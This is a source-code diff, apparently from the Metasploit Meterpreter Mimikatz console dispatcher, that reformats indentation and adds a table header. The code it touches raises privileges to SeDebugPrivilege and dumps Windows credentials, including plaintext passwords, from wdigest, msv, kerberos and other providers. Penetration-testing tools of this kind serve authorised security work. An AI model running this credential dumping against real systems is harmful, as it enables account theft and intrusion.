@@ -40,27 +40,28 @@ class Console::CommandDispatcher::Mimikatz
 
 	def mimikatz_request(provider, method)
 		get_privs
-                print_status("Retrieving #{provider} credentials")
-                accounts = method.call
-                
-                table = Rex::Ui::Text::Table.new(
-                        'Indent' => 0,
-                        'SortIndex' => 4,
-                        'Columns' =>
-                        [
-                                'AuthID', 'Package', 'Domain', 'User', 'Password'
-                        ]
-                )
-                        
-                accounts.each do |acc|
-                        table << [acc[:authid], acc[:package], acc[:domain], acc[:user],  acc[:password]]       
-                end
+		print_status("Retrieving #{provider} credentials")
+		accounts = method.call
 
-                table.print     
+		table = Rex::Ui::Text::Table.new(
+			'Header' => "#{provider} credentials",
+			'Indent' => 0,
+			'SortIndex' => 4,
+			'Columns' =>
+			[
+				'AuthID', 'Package', 'Domain', 'User', 'Password'
+			]
+		)
 
-                return true
+		accounts.each do |acc|
+			table << [acc[:authid], acc[:package], acc[:domain], acc[:user],  acc[:password]]
+		end
+
+		table.print
+
+		return true
 	end
-	
+
 	def cmd_wdigest(*args)
 		method = Proc.new { client.mimikatz.wdigest }
 		mimikatz_request("wdigest", method)
@@ -71,36 +72,36 @@ class Console::CommandDispatcher::Mimikatz
 		mimikatz_request("msv", method)
 	end
 
-        def cmd_livessp(*args)
-                method = Proc.new { client.mimikatz.livessp }
-                mimikatz_request("livessp", method)
-        end
-
-        def cmd_ssp(*args)
-                method = Proc.new { client.mimikatz.ssp }
-                mimikatz_request("ssp", method)
+	def cmd_livessp(*args)
+		method = Proc.new { client.mimikatz.livessp }
+		mimikatz_request("livessp", method)
 	end
 
-        def cmd_tspkg(*args)
-                method = Proc.new { client.mimikatz.tspkg }
-                mimikatz_request("tspkg", method)
-        end
+	def cmd_ssp(*args)
+		method = Proc.new { client.mimikatz.ssp }
+		mimikatz_request("ssp", method)
+	end
 
-        def cmd_kerberos(*args)
-                method = Proc.new { client.mimikatz.kerberos }
-                mimikatz_request("kerberos", method)
-        end
-	
+	def cmd_tspkg(*args)
+		method = Proc.new { client.mimikatz.tspkg }
+		mimikatz_request("tspkg", method)
+	end
+
+	def cmd_kerberos(*args)
+		method = Proc.new { client.mimikatz.kerberos }
+		mimikatz_request("kerberos", method)
+	end
+
 	def get_privs
-                unless system_check
-                        print_status("Attempting to getprivs")
-                        privs = client.sys.config.getprivs
-                        unless privs.include? "SeDebugPrivilege"
-                                print_warning("Did not get SeDebugPrivilege")
+		unless system_check
+			print_status("Attempting to getprivs")
+			privs = client.sys.config.getprivs
+			unless privs.include? "SeDebugPrivilege"
+				print_warning("Did not get SeDebugPrivilege")
 			else
 				print_good("Got SeDebugPrivilege")
-                        end
-                else
+			end
+		else
 			print_good("Running as SYSTEM")
 		end
 	end
@@ -120,7 +121,6 @@ class Console::CommandDispatcher::Mimikatz
 	def name
 		"Mimikatz"
 	end
-
 end
 
 end
